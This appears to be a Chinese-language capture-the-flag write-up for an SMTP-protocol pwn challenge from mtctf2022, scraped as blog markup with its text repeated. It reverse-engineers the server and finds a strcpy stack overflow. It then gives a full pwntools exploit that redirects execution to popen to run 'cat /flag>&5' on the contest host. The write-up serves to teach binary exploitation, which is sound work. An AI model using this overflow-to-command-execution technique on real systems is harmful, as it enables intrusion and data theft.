class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>跟进去看一下：</p>\n<p>里面有很多和网络编程有关的结构：</p>\n<p>解析hostname的addrinfo结构，以及</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;netdb.h&gt;</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">addrinfo</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_flags;   <span class=\"comment\">/* AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_family;  <span class=\"comment\">/* PF_xxx */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_socktype;    <span class=\"comment\">/* SOCK_xxx */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_protocol;    <span class=\"comment\">/* 0 or IPPROTO_xxx for IPv4 and IPv6 */</span></span><br><span class=\"line\">    <span class=\"type\">socklen_t</span> ai_addrlen;   <span class=\"comment\">/* length of ai_addr */</span></span><br><span class=\"line\">    <span class=\"type\">char</span>    *ai_canonname;  <span class=\"comment\">/* canonical name for hostname */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span>  <span class=\"title\">sockaddr</span> *<span class=\"title\">ai_addr</span>;</span>  <span class=\"comment\">/* binary address */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span>  <span class=\"title\">addrinfo</span> *<span class=\"title\">ai_next</span>;</span>  <span class=\"comment\">/* next structure in linked list */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过hostname、service和hints限定域名、服务/端口、期望的addrinfo来返回addrinfo结构链表（result）</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getaddrinfo</span><span class=\"params\">( <span class=\"type\">const</span> <span class=\"type\">char</span> *hostname, <span class=\"type\">const</span> <span class=\"type\">char</span> *service, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> addrinfo *hints, <span class=\"keyword\">struct</span> addrinfo **result )</span>;</span><br><span class=\"line\">getaddrinfo(<span class=\"number\">0</span>, service, &amp;s, &amp;pai);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 之后通过这个链表来创建socket</span></span><br><span class=\"line\">fd = socket(pai-&gt;ai_family, pai-&gt;ai_socktype, pai-&gt;ai_protocol);</span><br></pre></td></tr></table></figure>\n\n<p>之后设置socket的选项，绑定本地地址，并在该socket上监听。</p>\n<p>之后使用epoll进行事件触发：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">epoll_data</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr;</span><br><span class=\"line\">    <span class=\"type\">int</span> fd;</span><br><span class=\"line\">    <span class=\"type\">__uint32_t</span> u32;</span><br><span class=\"line\">    <span class=\"type\">__uint64_t</span> u64;</span><br><span class=\"line\">&#125; <span class=\"type\">epoll_data_t</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epoll_event</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">__uint32_t</span> events; <span class=\"comment\">/* Epoll events */</span></span><br><span class=\"line\">    <span class=\"type\">epoll_data_t</span> data; <span class=\"comment\">/* User data variable */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个epoll的句柄，size用来告诉内核这个监听的数目的大致数目，而不是能够处理的事件的最大个数。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create</span><span class=\"params\">(<span class=\"type\">int</span> size)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// epoll的事件注册函数，epoll_ctl向 epoll对象中添加、修改或者删除感兴趣的事件，返回0表示成功，否则返回–1，此时需要根据errno错误码判断错误类型。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_ctl</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"type\">int</span> op, <span class=\"type\">int</span> fd, <span class=\"keyword\">struct</span> epoll_event *event)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等待事件的产生。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误，需要检查 errno错误码判断错误类型。</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event * events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>等待连接，监听到连接后便开启一个新线程<code>session_worker</code>对连接进行处理，接收参数<code>arg</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//返回值：成功：fileno 出错：-1</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">accept</span><span class=\"params\">(<span class=\"type\">int</span> sockfd,<span class=\"keyword\">struct</span> sockaddr * addr,<span class=\"type\">socklen_t</span>* addrlen)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">v11 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class=\"line\">arg = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">*(_DWORD *)arg = v11;</span><br><span class=\"line\">*((_DWORD *)arg + <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">pthread_create(&amp;newthread, <span class=\"number\">0</span>, (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))session_worker, arg);</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;listener: initiated a new session worker&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>进<code>session_worker</code>看看：</p>\n<p>首先会保存旧的arg并对其进行reset，arg结构大概如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_arg</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> fd=old_arg.fd;</span><br><span class=\"line\">    <span class=\"type\">int</span> State=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> Mail=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> Recp=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_data</span>* <span class=\"title\">Data</span>;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">session_data</span>&#123;</span></span><br><span class=\"line\">    dd data_from=<span class=\"number\">0</span>;</span><br><span class=\"line\">    dd data_to=<span class=\"number\">0</span>;</span><br><span class=\"line\">   \tdd recv_msg=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>reset</code>后会显示连接成功，注册事件并继续等待，申请一个0x400的<code>request</code>接收请求。</p>\n<p>在<code>parse_request</code>中对<code>request</code>进行解析，会返回一个<code>DWORD[2]</code>的任务编码<code>cmd_code</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cmd</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> code;</span><br><span class=\"line\">    dd argument;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">code=<span class=\"number\">-1</span> argument=<span class=\"number\">0</span>:识别错误</span><br><span class=\"line\">code=<span class=\"number\">0</span> argument=argument_string_start:开头为HELO</span><br><span class=\"line\">code=<span class=\"number\">1</span> argument=argument_string_start:开头为MAIL FROM:</span><br><span class=\"line\">code=<span class=\"number\">2</span> argument=argument_string_start:开头为RCPT TO:</span><br><span class=\"line\">code=<span class=\"number\">3</span> argument=argument_string_start:开头为DATA</span><br><span class=\"line\">code=<span class=\"number\">4</span> argument=argument_string_start:开头为.\\r\\n或以\\r\\n.\\r\\n结尾</span><br><span class=\"line\">code=<span class=\"number\">5</span> argument=argument_string_start:开头为QUIT</span><br><span class=\"line\">argument_string_start可以为null</span><br></pre></td></tr></table></figure>\n\n<p>在这之后，如果满足<code>old_arg-&gt;State == 4 || *(_DWORD *)cmd_code == 4</code>就会走下面的程序流：</p>\n<p>如果满足<code>old_arg-&gt;State == 4 &amp;&amp; *(_DWORD *)cmd_code == 4 &amp;&amp; strlen((const char *)request) &gt; 3</code>，那么就会将<code>recv_msg</code>和<code>request</code>连接在一起放入<code>recv_msg</code>。</p>\n<p>否则会在<code>old_data</code>中保存<code>session_data</code>并将<code>request</code>存在<code>recv_msg</code>中。</p>\n<p>之后就会按照<code>cmd_code</code>进行不同的操作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 均对old_arg操作(初始State=0)</span></span><br><span class=\"line\">code=<span class=\"number\">-1</span>:syntax error</span><br><span class=\"line\">code=<span class=\"number\">0</span>:reset(old_arg)，设置State=<span class=\"number\">1</span>并执行Recp=argument</span><br><span class=\"line\">code=<span class=\"number\">1</span>:需要State==<span class=\"number\">1</span>，设置State=<span class=\"number\">2</span>并执行Data-&gt;data_from=argument</span><br><span class=\"line\">code=<span class=\"number\">2</span>:需要State==<span class=\"number\">2</span> or ==<span class=\"number\">3</span>，设置State=<span class=\"number\">3</span>并执行Data-&gt;data_to=argument</span><br><span class=\"line\">code=<span class=\"number\">3</span>:需要State!=<span class=\"number\">3</span>，设置State=<span class=\"number\">4</span></span><br><span class=\"line\">code=<span class=\"number\">4</span>:需要State==<span class=\"number\">4</span>，创建一个新线程sender_worker提交Data，reset(old_arg)，设置State=<span class=\"number\">1</span></span><br><span class=\"line\">code=<span class=\"number\">5</span>:需要State==<span class=\"number\">5</span>，设置State=<span class=\"number\">5</span>，会结束这次session</span><br></pre></td></tr></table></figure>\n\n<p>否则，也就是<code>old_arg-&gt;State == 4 || *(_DWORD *)cmd_code == 4</code>不满足：</p>\n<p>如果<code>recv_msg</code>中有内容，那么就会将<code>recv_msg</code>和<code>request</code>连接在一起放入<code>recv_msg</code>，否则直接将<code>request</code>放入<code>recv_msg</code></p>\n<p>再深入看看<code>sender_worker</code>：</p>\n<p>输出<code>data_from</code>，若其长度&lt;= 0x4F则copy到<code>bss段中的from</code>处</p>\n<p>输出<code>data_to</code>，若其长度&gt;0xFF(255)则copy到s处，存在<strong>栈溢出</strong>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> s[<span class=\"number\">256</span>]; <span class=\"comment\">// [esp+Ch] [ebp-10Ch] BYREF  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( len &lt;= <span class=\"number\">0xFF</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sender: TO: %s\\n&quot;</span>, v3-&gt;data_to);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(s, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)v3-&gt;data_to);       <span class=\"comment\">// 栈溢出</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sender: TO: %s\\n&quot;</span>, s);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后输出<code>recv_msg</code>。</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>在<code>sender_worker</code>中存在栈溢出，若<code>data_to</code>长度&gt;0xFF(255)则copy到s(ebp-0x10c)处，存在<strong>栈溢出</strong>。若<code>data_from</code>长度&lt;= 0x4F则copy到<code>bss段中的from</code>处。</p>\n<p>由于每次都会创建一个新的<code>sender_worker</code>线程完成工作，因此难以采取ret2libc。但<code>data_from</code>保存在<code>bss</code>段中，可以试试往里面写入shellcode（虽然这里是RW，但还是试试吧），通过栈溢出劫持程序到此处运行shellcode。</p>\n<p>尝试的时候遇到了个问题，程序会卡在一个地方。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\"># eax=0x61616161</span></span><br><span class=\"line\">  0x8049ac5 &lt;sender_worker+295&gt;    add    esp, 0x10</span><br><span class=\"line\">  0x8049ac8 &lt;sender_worker+298&gt;    mov    eax, dword ptr [ebp - 0xc]</span><br><span class=\"line\">► 0x8049acb &lt;sender_worker+301&gt;    mov    eax, dword ptr [eax + 8] <span class=\"comment\"># 会卡在这里</span></span><br><span class=\"line\">  0x8049ace &lt;sender_worker+304&gt;    <span class=\"built_in\">test</span>   eax, eax</span><br><span class=\"line\">  0x8049ad0 &lt;sender_worker+306&gt; </span><br></pre></td></tr></table></figure>\n\n<p>估计是因为变量v3被覆盖，找不到<code>recv_msg</code>了，需要找一个地址<code>addr</code>，并且<code>addr+0x8</code>可以访问。</p>\n<p>最后虽然跳转到覆盖的返回地址，但果然bss段里面的shellcode无法执行。</p>\n<p>据说<code>popen()</code>函数可以执行<code>sh</code>指令，尝试一下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE * <span class=\"title function_\">popen</span><span class=\"params\">( <span class=\"type\">const</span> <span class=\"type\">char</span> * command,<span class=\"type\">const</span> <span class=\"type\">char</span> * type)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令。参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果 type 为 r，那么调用进程读进 command 的标准输出。</span></span><br><span class=\"line\"><span class=\"comment\">//如果 type 为 w，那么调用进程写到 command 的标准输入。</span></span><br></pre></td></tr></table></figure>\n\n<p>执行<code>sh</code>好像没有用，虽然运行了<code>/bin/dash</code>，但输出过去的信息不会产生作用，不知道是不是因为没有send回来。</p>\n<p>后面换了<code>cat /flag&gt;&amp;5</code>，在本地起的可以返回<code>flag</code>。</p>\n<p>但远程的不行，可能是因为本地用的<code>fd</code>刚好是5，但远程的不是。</p>\n<p>爆破远程的<code>fd</code>到1030都不行，可能是因为其他原因吧，docker的和远程一样都不行。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;localhost&#x27;,9999)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;43.142.108.3&#x27;</span>,<span class=\"number\">28972</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Hello</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;HELO&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Mail_from</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;MAIL FROM:&#x27;</span>+content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Rcpt_to</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;RCPT TO:&#x27;</span>+content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Data</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">b&#x27;DATA&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Sender</span>():</span><br><span class=\"line\">    r()</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;.\\r\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">a_str=<span class=\"number\">0x0804B141</span></span><br><span class=\"line\">from_addr=<span class=\"number\">0x0804d140</span></span><br><span class=\"line\">Hello()</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;cat /flag&gt;&amp;5&quot;</span></span><br><span class=\"line\">Mail_from(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x100</span>+p32(from_addr+<span class=\"number\">0x40</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xc</span>+p32(elf.plt[<span class=\"string\">&#x27;popen&#x27;</span>])+p32(<span class=\"number\">0xdeadbeef</span>)+p32(from_addr)+p32(elf.search(<span class=\"string\">b&quot;r\\x00&quot;</span>).__next__())</span><br><span class=\"line\">Rcpt_to(payload)</span><br><span class=\"line\">Data()</span><br><span class=\"line\">Sender()</span><br><span class=\"line\">ru(<span class=\"string\">&quot;250 Ok\\n&quot;</span>)</span><br><span class=\"line\">flag=ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;flag&quot;</span>,flag)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>mtctf2022，一道协议题，这种题大多难在逆向，漏洞本身没什么难度。</p>","more":"<p>32位的，就开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/smtp/docker/bin/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>main函数起了一个listener，默认端口是9999。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( argc == <span class=\"number\">2</span> )</span><br><span class=\"line\">    listener((<span class=\"type\">char</span> *)argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  listener(<span class=\"string\">&quot;9999&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>跟进去看一下：</p>\n<p>里面有很多和网络编程有关的结构：</p>\n<p>解析hostname的addrinfo结构，以及</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;netdb.h&gt;</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">addrinfo</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_flags;   <span class=\"comment\">/* AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_family;  <span class=\"comment\">/* PF_xxx */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_socktype;    <span class=\"comment\">/* SOCK_xxx */</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ai_protocol;    <span class=\"comment\">/* 0 or IPPROTO_xxx for IPv4 and IPv6 */</span></span><br><span class=\"line\">    <span class=\"type\">socklen_t</span> ai_addrlen;   <span class=\"comment\">/* length of ai_addr */</span></span><br><span class=\"line\">    <span class=\"type\">char</span>    *ai_canonname;  <span class=\"comment\">/* canonical name for hostname */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span>  <span class=\"title\">sockaddr</span> *<span class=\"title\">ai_addr</span>;</span>  <span class=\"comment\">/* binary address */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span>  <span class=\"title\">addrinfo</span> *<span class=\"title\">ai_next</span>;</span>  <span class=\"comment\">/* next structure in linked list */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span 